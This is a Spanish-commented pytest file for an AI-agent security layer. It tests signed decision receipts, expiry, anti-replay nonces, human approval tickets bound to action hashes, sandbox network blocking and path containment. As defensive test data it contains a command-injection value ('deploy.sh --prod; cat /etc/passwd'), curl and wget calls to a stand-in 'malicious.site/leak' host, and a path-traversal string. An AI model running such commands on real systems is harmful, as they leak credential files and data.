"""Pruebas rigurosas para las capacidades y defensas implementadas en Fase 0 (v0.2.2).

Verifica:
1. Firmas HMAC-SHA256 en DecisionReceipt y rechazo de capabilities manipulados o no firmados.
2. Expiración temporal de capabilities (expires_at / TTL).
3. NonceStore y defensa anti-replay duradera con poda por TTL.
4. HumanApprovalTicket vinculado estrictamente a action_hash y con expiración.
5. LocalProcessSandbox: defensa anti-symlink (os.path.realpath), bloqueo de red por defecto y limpieza de proxies.
6. CompletionVerifier: verificación tipada con CriterionType y CriterionStatus.
"""

from datetime import datetime, timedelta
import os
import tempfile
import time
import pytest

from jev_navigator.domain.action import ActionCandidate, ToolCall, compute_action_hash
from jev_navigator.domain.decision import (
    DecisionReceipt,
    DecisionStatus,
    PolicyDecision,
    compute_receipt_signature,
    compute_state_hash,
    verify_receipt_signature,
)
from jev_navigator.domain.goal import CriterionType, Goal, SuccessCriterion
from jev_navigator.policy.engine import PolicyEngine
from jev_navigator.policy.permissions import HumanApprovalTicket, PermissionManager
from jev_navigator.providers.replay import ReplayProvider
from jev_navigator.reasoning.completion import CompletionVerifier, CriterionStatus
from jev_navigator.runtime.executor import PolicyViolation, SecureExecutor
from jev_navigator.runtime.navigator import Navigator
from jev_navigator.runtime.nonce_store import InMemoryNonceStore
from jev_navigator.runtime.sandbox import LocalProcessSandbox, SandboxViolation
from jev_navigator.runtime.state import SessionState


@pytest.fixture
def mock_session() -> SessionState:
    goal = Goal(objective="Test Phase 0 Hardening", success_criteria=["criterio 1"])
    return SessionState(session_id="sess_hardening_01", goal=goal)


@pytest.fixture
def test_action() -> ActionCandidate:
    return ActionCandidate(
        id="act_hardened_01",
        description="Lectura protegida",
        tool_call=ToolCall(tool_name="read_file", arguments={"path": "safe.txt"}),
    )


# =========================================================================
# 1. Firmas Criptográficas HMAC-SHA256 en Receipts
# =========================================================================

def test_hmac_signature_verification_and_tampering(mock_session, test_action):
    """Verifica que SecureExecutor verifique la firma HMAC y rechace firmas alteradas."""
    secret = "super_secret_hardening_key_32bytes_long"
    executor = SecureExecutor(dry_run=True, secret_key=secret)

    action_hash = compute_action_hash(test_action)
    state_hash = compute_state_hash(mock_session.to_snapshot())
    nonce = "unique_nonce_001"

    valid_sig = compute_receipt_signature(
        secret_key=secret,
        decision_id="dec_sig_01",
        session_id=mock_session.session_id,
        action_hash=action_hash,
        state_hash=state_hash,
        nonce=nonce,
        decision_status=DecisionStatus.ALLOW,
    )

    valid_receipt = DecisionReceipt(
        decision_id="dec_sig_01",
        session_id=mock_session.session_id,
        action_id=test_action.id,
        state_hash=state_hash,
        action_hash=action_hash,
        decision_status=DecisionStatus.ALLOW,
        nonce=nonce,
        signature=valid_sig,
    )

    # 1. Firma legítima se ejecuta correctamente
    obs = executor.execute(test_action, mock_session, receipt=valid_receipt)
    assert obs.success is True

    # 2. Recibo con firma manipulada es rechazado
    tampered_receipt = valid_receipt.model_copy(
        update={"signature": "tampered_signature_hex_value_00000000000000000000"}
    )
    with pytest.raises(PolicyViolation) as exc_info:
        executor.execute(test_action, mock_session, receipt=tampered_receipt)
    assert "firma HMAC del capability es inválida" in str(exc_info.value)

    # 3. Recibo sin firma cuando executor tiene secret_key es rechazado
    unsigned_receipt = valid_receipt.model_copy(update={"signature": None, "nonce": "nonce_unsigned"})
    with pytest.raises(PolicyViolation) as exc_info:
        executor.execute(test_action, mock_session, receipt=unsigned_receipt)
    assert "carece de firma HMAC auténtica" in str(exc_info.value)


# =========================================================================
# 2. Expiración Temporal de Capabilities (expires_at / TTL)
# =========================================================================

def test_capability_expiration_rejection(mock_session, test_action):
    """Verifica que un capability con expires_at en el pasado sea denegado por expiración."""
    executor = SecureExecutor(dry_run=True)
    past_time = datetime.utcnow() - timedelta(seconds=10)

    expired_receipt = DecisionReceipt(
        decision_id="dec_exp_01",
        session_id=mock_session.session_id,
        action_id=test_action.id,
        state_hash=compute_state_hash(mock_session.to_snapshot()),
        action_hash=compute_action_hash(test_action),
        decision_status=DecisionStatus.ALLOW,
        expires_at=past_time,
    )

    assert expired_receipt.is_expired() is True
    with pytest.raises(PolicyViolation) as exc_info:
        executor.execute(test_action, mock_session, receipt=expired_receipt)
    assert "capability ha expirado" in str(exc_info.value)


# =========================================================================
# 3. NonceStore y Prevención de Replay
# =========================================================================

def test_nonce_store_ttl_and_replay_prevention():
    """Verifica que InMemoryNonceStore evite colisiones de nonce y purgue por TTL."""
    store = InMemoryNonceStore()
    decision_id = "dec_100"
    nonce = "test_nonce_replay_01"
    short_expiry = datetime.utcnow() + timedelta(seconds=1.0)

    # Primer consumo es exitoso
    assert store.consume(decision_id, nonce, expires_at=short_expiry) is True
    assert store.has_been_consumed(decision_id, nonce) is True

    # Segundo consumo falla (replay)
    assert store.consume(decision_id, nonce, expires_at=short_expiry) is False

    # Tras expirar TTL y purgar, el nonce puede volver a registrarse
    time.sleep(1.1)
    pruned = store.prune_expired()
    assert pruned >= 1
    assert store.has_been_consumed(decision_id, nonce) is False
    assert store.consume(decision_id, nonce) is True


# =========================================================================
# 4. HumanApprovalTicket Vinculado a action_hash y Expiración
# =========================================================================

def test_human_approval_ticket_action_hash_binding():
    """Verifica que el ticket de aprobación humana quede vinculado al hash exacto de la acción."""
    mgr = PermissionManager()
    action = ActionCandidate(
        id="act_deploy",
        description="Desplegar artefacto",
        tool_call=ToolCall(tool_name="run_command", arguments={"cmd": "deploy.sh --prod"}),
    )
    action_hash = compute_action_hash(action)

    # 1. Confirmar con action_hash
    ticket = mgr.confirm_action(
        action_id=action.id,
        action_hash=action_hash,
        approver_id="security_admin",
        ttl_seconds=60.0,
    )
    assert ticket.action_hash == action_hash
    assert ticket.is_expired() is False
    assert mgr.is_action_confirmed(action.id, action_hash=action_hash) is True

    # 2. Acción con argumentos manipulados (mismo id, distinto hash) no es aprobada
    tampered_action = ActionCandidate(
        id="act_deploy",
        description="Desplegar artefacto manipulado",
        tool_call=ToolCall(tool_name="run_command", arguments={"cmd": "deploy.sh --prod; cat /etc/passwd"}),
    )
    tampered_hash = compute_action_hash(tampered_action)
    assert mgr.is_action_confirmed(action.id, action_hash=tampered_hash) is False

    # 3. Ticket expirado no es válido
    expired_ticket = HumanApprovalTicket(
        action_id="act_exp",
        action_hash="hash_exp",
        expires_at=datetime.utcnow() - timedelta(seconds=5),
    )
    assert expired_ticket.is_expired() is True


# =========================================================================
# 5. LocalProcessSandbox: Anti-Symlink, Red y Limpieza de Proxies
# =========================================================================

def test_sandbox_network_blocking_and_proxy_neutralization():
    """Verifica que LocalProcessSandbox bloquee comandos de red y neutralice proxies a dummy localhost."""
    with tempfile.TemporaryDirectory() as temp_dir:
        sandbox = LocalProcessSandbox(workspace_root=temp_dir, allow_network=False)

        # 1. Bloqueo de comandos de red lanza SandboxViolation
        with pytest.raises(SandboxViolation) as exc_curl:
            sandbox.execute_command("curl https://malicious.site/leak")
        assert "Violación de política de red" in str(exc_curl.value)

        with pytest.raises(SandboxViolation) as exc_wget:
            sandbox.execute_command("wget https://malicious.site/leak")
        assert "Violación de política de red" in str(exc_wget.value)

        # 2. Neutralización de proxies de red
        os.environ["HTTP_PROXY"] = "http://malicious-proxy:8080"
        os.environ["HTTPS_PROXY"] = "http://malicious-proxy:8080"
        try:
            env = sandbox._sanitize_environment()
            assert env["HTTP_PROXY"] == "http://127.0.0.1:0"
            assert env["HTTPS_PROXY"] == "http://127.0.0.1:0"
        finally:
            os.environ.pop("HTTP_PROXY", None)
            os.environ.pop("HTTPS_PROXY", None)


def test_sandbox_symlink_and_realpath_containment(monkeypatch):
    """Verifica que LocalProcessSandbox prevenga evasión por symlinks y traversals usando realpath."""
    with tempfile.TemporaryDirectory() as temp_dir:
        sandbox = LocalProcessSandbox(workspace_root=temp_dir, allow_network=False)

        # 1. Path traversal relativo
        with pytest.raises(SandboxViolation):
            sandbox._validate_path_containment("../outside_file.txt")

        # 2. Simulación de symlink que apunta a ruta exterior
        target_outside = os.path.realpath(os.path.join(temp_dir, "..", "external_secret.txt"))
        monkeypatch.setattr(os.path, "realpath", lambda p: target_outside if "symlink" in p else p)

        with pytest.raises(SandboxViolation) as exc_symlink:
            sandbox._validate_path_containment("symlink_pointer")
        assert "Evasión de ruta detectada" in str(exc_symlink.value)


# =========================================================================
# 6. CompletionVerifier: Criterios Tipados
# =========================================================================

def test_completion_verifier_with_typed_criteria():
    """Verifica que CompletionVerifier evalúe formalmente criterios tipados (FILE_EXISTS, TESTS_PASS)."""
    with tempfile.TemporaryDirectory() as tmp_dir:
        verifier = CompletionVerifier(workspace_root=tmp_dir)
        real_file = os.path.join(tmp_dir, "target.txt")
        with open(real_file, "w") as f:
            f.write("content")

        goal = Goal(
            objective="Generar archivo y validar tests",
            criteria=[
                SuccessCriterion(
                    id="crit_file",
                    description="El archivo target.txt debe existir",
                    criterion_type=CriterionType.FILE_EXISTS,
                    target="target.txt",
                ),
                SuccessCriterion(
                    id="crit_tests",
                    description="Tests deben pasar",
                    criterion_type=CriterionType.TESTS_PASS,
                ),
            ],
        )

        state = SessionState(session_id="sess_crit_01", goal=goal)

        # Paso con resultado de tests exitoso
        state.add_step(
            action=ActionCandidate(
                id="act_1",
                description="Correr pytest",
                tool_call=ToolCall(tool_name="run_command", arguments={"cmd": "pytest"}),
            ),
            decision=PolicyDecision(status=DecisionStatus.ALLOW),
            observation="pytest: 10 passed in 1.2s",
        )

        finish_action = ActionCandidate(
            id="act_finish",
            description="Terminar tarea",
            tool_call=ToolCall(tool_name="finish", arguments={}),
        )

        assessment = verifier.verify(goal, state, finish_action)
        assert assessment.is_complete is True
        assert len(assessment.satisfied_criteria) == 2
        assert len(assessment.missing_criteria) == 0
        assert all(e.status == CriterionStatus.VERIFIED for e in assessment.evaluations)
